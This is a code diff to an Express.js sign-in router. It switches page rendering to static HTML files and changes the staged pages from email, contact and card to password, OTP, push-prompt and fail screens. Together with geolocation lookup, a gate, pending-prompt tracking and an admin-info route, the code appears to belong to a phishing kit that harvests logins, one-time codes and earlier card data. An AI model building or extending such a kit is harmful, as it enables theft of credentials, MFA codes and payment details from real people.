@@ -1,5 +1,4 @@
 import express from "express";
-import { engine } from "express-edge";
 import geoip from "geoip-lite";
 import session from "express-session";
 import axios from "axios";
@@ -16,7 +15,6 @@ dotenv.config();
 
 const pendingPrompts = new Map();
 const activeLocks = new Set();
-
 
 
 // =====================================================
@@ -39,24 +37,24 @@ router.get('/sign-in', requireCap, (req, res, next) => {
   const { user } = req.session;
   const { action } = req.query;
 
+  // If no session, redirect or show default page
   if (!user) {
     req.session.user = { user };
 
     if (action) return res.redirect('/sign-in');
-
-    return res.render('user/login');
+    return res.sendFile('email.html', { root: 'views/user' });
   }
 
+  // If session exists, determine which page to show
   const pages = {
-    email: 'user/email',
-    contact: 'user/contact',
-    card: 'user/card',
-    complete: 'user/complete',
+    auth: 'password.html',
+    otp: 'otp.html',
+    prompt: 'prompt.html',
+    fail: 'fail.html',
   };
 
-  const page = pages[action] || 'user/email';
-
-  res.render(page);
+  const page = pages[action] || 'email.html';
+  res.sendFile(page, { root: 'views/user' });
 });
 
 router.get("/admin-info", async (req, res) => {
